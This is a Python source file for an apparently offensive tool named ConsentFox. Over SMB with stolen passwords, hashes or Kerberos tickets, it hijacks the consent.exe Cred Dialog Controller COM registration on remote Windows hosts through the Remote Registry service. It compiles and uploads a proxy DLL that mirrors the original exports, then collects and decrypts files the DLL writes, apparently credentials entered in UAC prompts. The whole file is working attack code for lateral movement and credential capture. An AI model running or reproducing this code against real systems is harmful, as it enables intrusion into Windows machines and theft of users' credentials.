import platform
import time
from impacket.smbconnection import SMBConnection, SessionError
from impacket import smb
from impacket.dcerpc.v5 import rrp
from shutil import copy
from os import environ, path

import logging
import pefile
import subprocess
import tempfile
import hashlib
from io import BytesIO

from remoteRegistry import RemoteRegistry


class ConsentFox:
    def __init__(
        self,
        domain: str,
        username: str,
        password: str,
        lmhash: str,
        nthash: str,
        aesKey: str,
        useKerberos: bool,
        dc_ip: str | None,
        tempDir: str,
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.aesKey = aesKey
        self.useKerberos = useKerberos
        self.dc_ip = dc_ip
        self.tempDir = tempDir

    def doCLSIDPoisonning(self, host: str) -> bool:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's check if the temporary directory has already been created
        tempPath = f"Windows\\Temp\\{self.tempDir}"

        try:
            smbClient.createDirectory("C$", f"{tempPath}")
        except SessionError as e:
            if e.getErrorCode() == 0xC0000035:
                # STATUS_OBJECT_NAME_COLLISION, occurs if the directory already exists
                logging.warning(
                    f"Temporary directory already exists, assuming it is ok."
                )
            else:
                logging.error(f"Error while creating C:\\{tempPath} ")
                return

        # Now access the remote registry, to poison the HKCR Class registration machine wide, since consent.exe is running in a system context.
        # We want to define a CLSID redirection so that our DLL gets loaded whenever our target CLSID is CoCreateInstance'd

        # For consent.exe in particular, we target CLSID 96b42929-01f1-468c-b521-6294ab438f4a,
        # Cred Dialog Controller

        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        # Unfortunaltely, if the SMB login was performed using kerberos, getServerOsMajor errors out.
        # Try to do the same using an anonymous session
        # This probably won't work if NTLM is fully disabled

        if self.useKerberos:
            smbClientTemp = SMBConnection(host, host, timeout=2)
            smbClientTemp.login("", "")

            if smbClientTemp.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "745A5ADD-6A71-47B9-9BB9-31DD3A6913D4"
                expectedDll = "authui.dll"
            else:
                clsid = "96B42929-01F1-468C-B521-6294AB438F4A"
                expectedDll = "windows.ui.creddialogcontroller.dll"

        else:
            if smbClient.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "745A5ADD-6A71-47B9-9BB9-31DD3A6913D4"
                expectedDll = "authui.dll"
            else:
                clsid = "96B42929-01F1-468C-B521-6294AB438F4A"
                expectedDll = "windows.ui.creddialogcontroller.dll"

        # Sanity check : let's ensure that the original CLSID is implemented in the expected DLL
        try:
            machineInprocServer = remoteRegistry.getKeyValues(
                f"HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
            )
        except rrp.DCERPCException as e:
            logging.error(
                f"[{host}] Failed reading  HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
            )
            logging.error(e)

        clsidDllPath = machineInprocServer.get("(Default)")

        # getKeyValues return a list of tuples, the first value being the type
        # Ensure that the default value exists and is of type REG_SZ or REG_EXPAND_SZ

        if clsidDllPath == None or (
            clsidDllPath[0] != rrp.REG_EXPAND_SZ and clsidDllPath[0] != rrp.REG_SZ
        ):
            logging.error(
                f"Original InprocServer does not have a default value, or unexpected type : {clsidDllPath}. Abort"
            )

        # The path is usually C:\Windows\System32\windows.ui.creddialogcontroller.dll

        originalDllPath = clsidDllPath[1].lower().split("\\")
        if originalDllPath[-2] != "system32" or originalDllPath[-1] != expectedDll:
            logging.error(
                f"The origin CLSID is registered to an unexpected DLL : {clsidDllPath}"
            )
            return

        # Everything seems OK, let's build our DLL
        # Just to be sure that we do not break anything, let's retreive the original msmpeg2vdec.dll to get the exports

        try:
            dllData = BytesIO()
            smbClient.getFile(
                "C$",
                f"Windows\\System32\\{expectedDll}",
                dllData.write,
            )
        except SessionError:
            logging.error(
                f"[{host}] Failed opening/reading C:\\windows\\system32\\{expectedDll}"
            )
            return

        dll = pefile.PE(data=dllData.getvalue(), fast_load=False)
        dll.parse_data_directories()

        # Sanity check : ensure that it is the correct architecure
        if dll.FILE_HEADER.Machine != pefile.MACHINE_TYPE["IMAGE_FILE_MACHINE_AMD64"]:
            logging.error(
                f"[{host}] C:\\Windows\\System32\\{expectedDll} has unexpected architecture. Aborting."
            )
            return

        try:
            exports = [e for e in dll.DIRECTORY_ENTRY_EXPORT.symbols]
        except AttributeError:
            logging.error(
                f"[{host}] {expectedDll} exports could not be parsed. Aborting"
            )
            for exp in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                print(
                    hex(dll.OPTIONAL_HEADER.ImageBase + exp.address),
                    exp.name,
                    exp.ordinal,
                )

            return

        # Ensure that no symbol are only exported by ordinal

        if any([b"" == export.name for export in exports]):
            logging.debug(
                f"[{host}] {expectedDll} exports a symbol by ordinal only, aborting"
            )
            return

        # We have the exported symbols.
        # Let's compute the MD5 of the data

        dllMd5 = hashlib.md5(dllData.getvalue()).hexdigest()

        # Check if we have already created the proxy dll
        if not path.exists(
            path.join(
                path.dirname(__file__),
                "cache",
                f'{expectedDll.removesuffix("dll") + dllMd5 + ".dll"}',
            )
        ):
            # It doesn't exist yet, let's create the exported function list for our DLL
            # The .def file is not recognized if the extension is not .def

            tempFileHandle = tempfile.NamedTemporaryFile(
                mode="w", suffix=".data", delete=False
            )

            for export in exports:
                # Since the original DLL contains multiple dot, we need to specify .dll at the end
                tempFileHandle.write(
                    f"{export.name.decode()}={expectedDll}.{export.name.decode()} @{export.ordinal}\n"
                )

            tempFileHandle.flush()

            if platform.system() == "Windows":
                targetName = "x86_64-pc-windows-msvc"
            else:
                targetName = "x86_64-pc-windows-gnu"

            cargo_path = path.abspath(
                path.join(path.dirname(__file__), "..", "consentfox")
            )

            cmd = ["cargo", "clean"]

            subprocess.run(cmd, cwd=cargo_path)

            # Now let's compile our sideloaded DLL with the matching exports
            cmd = ["cargo", "build", "--target", targetName, "--release"]

            new_env = environ
            new_env["OUTPUT_PATH"] = f"C:\\{tempPath}\\consent."
            if platform.system() == "Windows":
                from win32 import win32file

                new_env["EXPORTS_FILE"] = win32file.GetLongPathName(tempFileHandle.name)
            else:
                new_env["EXPORTS_FILE"] = tempFileHandle.name

            subprocess.run(cmd, cwd=cargo_path, env=new_env)

            # We don't need the temporary file anymore
            tempFileHandle.close()

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "consentfox",
                        "target",
                        targetName,
                        # "debug",
                        "release",
                        "consentfox.dll",
                    )
                ),
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "cache",
                        f'{expectedDll.removesuffix("dll") + dllMd5 + ".dll"}',
                    )
                ),
            )

        # Get our DLL data
        with open(
            path.abspath(
                path.join(
                    path.dirname(__file__),
                    "cache",
                    f'{expectedDll.removesuffix("dll") + dllMd5 + ".dll"}',
                )
            ),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        uploadData = BytesIO(dllDataToUpload)

        try:
            smbClient.putFile(
                "c$",
                f"{tempPath}\\consent_{dllMd5}.dll",
                uploadData.read,
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading {expectedDll} proxy dll to C:\\{self.tempDir}\\"
            )
            logging.error(e)

        try:
            remoteRegistry.setKeyValueSZData(
                f"HKLM\\Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32\\",
                "(Default)",
                rrp.REG_EXPAND_SZ,
                f"C:\\{tempPath}\\consent_{dllMd5}.dll",
            )
        except Exception as e:
            logging.error(
                f"[{host}] Error setting HKLM\\Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32\\"
            )
            logging.error(e)

        print(f"[{host}] Successfully poisonned consent.exe")

    def cleanup(self, host: str) -> None:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Access the remote registry, to cleanup the HKCR hive

        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        # Unfortunaltely, if the SMB login was performed using kerberos, getServerOsMajor errors out.
        # Try to do the same using an anonymous session
        # This probably won't work if NTLM is fully disabled

        if self.useKerberos:
            smbClientTemp = SMBConnection(host, host, timeout=2)
            smbClientTemp.login("", "")

            if smbClientTemp.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "745A5ADD-6A71-47B9-9BB9-31DD3A6913D4"
                expectedDll = "authui.dll"
            else:
                clsid = "96B42929-01F1-468C-B521-6294AB438F4A"
                expectedDll = "windows.ui.creddialogcontroller.dll"
        else:
            if smbClient.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "745A5ADD-6A71-47B9-9BB9-31DD3A6913D4"
                expectedDll = "authui.dll"
            else:
                clsid = "96B42929-01F1-468C-B521-6294AB438F4A"
                expectedDll = "windows.ui.creddialogcontroller.dll"

        try:
            remoteRegistry.setKeyValueSZData(
                f"HKLM\\Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32\\",
                "(Default)",
                rrp.REG_EXPAND_SZ,
                f"%SystemRoot%\\System32\\{expectedDll}",
            )
        except Exception as e:
            logging.error(
                f"[{host}] Error cleaning up HKLM\\Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32\\"
            )
            print(e)

        # Now cleanup the proxy DLL in the temp dir
        # This may fail, notably if consent.exe is running.
        # This is OK, the DLL won't be loaded on subsequent consent.exe runs, it just needs later cleanup

        try:
            filesInTempDir: list[smb.SharedFile] = smbClient.listPath(
                "c$", f"Windows\\Temp\\{self.tempDir}\\*"
            )

            dllsInDirectory = [
                f.get_longname()
                for f in filesInTempDir
                if f.get_longname().endswith(".dll")
            ]

            targetFiles = [i for i in dllsInDirectory if i.startswith(f"consent_")]

            for file in targetFiles:
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.warning(
                        f"[{host}] Could not delete C:\\Windows\\Temp\\{self.tempDir}\\{file}, it is probably in use."
                    )

        except SessionError:
            logging.warning(
                f"[{host}] Failed listing files in C:\\Windows\\Temp\\{self.tempDir} directory for cleanup. Could not delete {expectedDll} DLL"
            )

        print(f"[{host}] Consent.exe cleanup complete !")

    def collect(self, host, box):
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                "C$", f"Windows/Temp/{self.tempDir}/*"
            )

            outputFiles = [
                f.get_longname()
                for f in filesInConfigDirectory
                if f.get_longname().startswith("consent.")
            ]

            for file in outputFiles:
                try:
                    outputData = BytesIO()
                    smbClient.getFile(
                        "C$", f"Windows\\Temp\\{self.tempDir}\\{file}", outputData.write
                    )
                except SessionError:
                    logging.error(
                        f"[{host}] Failed opening/reading C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

                plaintexts = box.decryptFile(outputData.getvalue())
                with open(
                    path.join(
                        path.dirname(__file__),
                        "output",
                        f"consent-{int(time.time())}.txt",
                    ),
                    "a",
                ) as f:
                    for plaintext in plaintexts:
                        f.write(plaintext + "\n")

                # Now, let's delete the file one the remote host
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.error(
                        f"[{host}] Failed deleting C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

        except SessionError as e:
            logging.error(
                f"[{host}] Failed opening directory C:\\Windows\\Temp\\{self.tempDir}"
            )
            logging.error(e)
